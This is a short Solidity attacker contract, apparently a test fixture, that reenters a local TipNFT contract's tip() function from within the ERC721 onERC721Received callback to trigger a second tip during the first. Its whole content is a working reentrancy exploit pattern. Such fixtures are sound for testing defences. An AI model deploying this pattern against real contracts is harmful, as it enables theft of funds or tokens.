// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TipNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Reenter is IERC721Receiver {
    TipNFT public immutable target;
    bool private triggered;

    constructor(TipNFT _target) payable {
        target = _target;
    }

    function attack() external payable {
        target.tip{value: msg.value}();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (!triggered) {
            triggered = true;
            target.tip{value: 0.001 ether}();
        }
        return this.onERC721Received.selector;
    }
}
